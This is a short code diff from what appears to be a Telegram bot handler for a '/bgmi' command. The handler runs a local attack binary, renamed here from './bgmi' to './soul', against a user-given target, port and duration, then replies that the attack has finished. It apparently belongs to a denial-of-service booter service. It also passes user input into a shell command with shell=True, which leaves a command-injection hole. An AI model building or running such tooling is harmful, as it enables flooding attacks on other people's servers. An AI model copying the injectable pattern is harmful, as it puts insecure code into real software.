@@ -417,7 +417,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./soul {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"𝒀𝑶𝑼𝑹 𝑨𝑻𝑻𝑨𝑪𝑲 𝑭𝑰𝑵𝑰𝑺𝑯𝑬𝑫. \n\nTarget: {target}\n Port: {port} \nPort: {time}"
         else:
